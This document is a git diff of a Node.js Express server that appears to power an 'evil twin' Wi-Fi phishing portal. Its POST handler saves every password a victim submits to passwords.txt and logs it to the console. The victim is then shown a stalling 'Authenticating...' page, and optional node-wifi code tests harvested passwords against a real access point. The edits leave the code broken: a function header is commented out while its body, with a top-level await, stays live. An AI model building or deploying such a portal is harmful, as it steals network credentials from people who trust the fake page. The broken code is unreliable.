@@ -9,10 +9,10 @@ const fs = require('fs');
 const BodyParser = require('body-parser')
 app.use(BodyParser.urlencoded({extended: true}))
 
-/* Import node-wifi 
-const wifi = require('node-wifi');
+//Import node-wifi 
+//const wifi = require('node-wifi');
 //https://www.npmjs.com/package/node-wifi
-*/
+
 
 
 var title ='';
@@ -59,16 +59,14 @@ const generateHTML = (title) => `<!DOCTYPE html>
 </body>
 </html>`;
  
-/* 
-Here we check if the given password is correct
-# checkPassword - is a Promise
- const checkPassword = async (password) => {
+
+//Here we check if the given password is correct
+//# checkPassword - is a Promise
+ //const checkPassword = async (password) => {
     // Define the interface that will sent the connection request
     const iface = process.argv[2].toString();
     // The name of the AP that we will try to connect to, in order to check the given password
     const ssid = process.argv[3].toString();
-    //const iface = "wlxc83a35c2e0b7";
-    //const ssid = "Linksys00314";
     // This function try to connect to the AP with the given password
     await wifi.init({ iface });
     try {
@@ -82,7 +80,7 @@ Here we check if the given password is correct
         return false;
     }
 };
-*/
+
 
 // What to do if there is a GET request
 app.get('/', (req, res) => {
@@ -93,9 +91,9 @@ app.get('/', (req, res) => {
 });
 
 // What to do if there is a POST request
-/* 
-app.post('/password', async (req, res) => {
-*/
+
+//app.post('/password', async (req, res) => {
+
 app.post('/password', (req, res) => {
     // In POST request the information is in the body
     // The information in our case is the password that the client entered
@@ -103,13 +101,13 @@ app.post('/password', (req, res) => {
     // Write the given password in the 'password.txt' file & Print a message in the server side
     fs.appendFileSync('passwords.txt', `password : ${password} \n`);
     console.log(`The client enter another password : ${password} \nYou may also see this password in - passwords.txt`);
-    /*
+    
     // ans will be True - if the password is correct
     // ans will be False - if the password is incorrect
-    const ans = await checkPassword(password);
+   // const ans = await checkPassword(password);
     // title will be the message for the client side, we will insert it to the new HTML page
-    title = ans ? 'Great succeess :)' : 'The password is incorrect. :(';
-    */
+    //title = ans ? 'Great succeess :)' : 'The password is incorrect. :(';
+    
     title = "Authenticating...\n If you wait more than 1min. the password is INCORRECT."
     // Response - return the new HTML page 
     res.send(generateHTML(title));
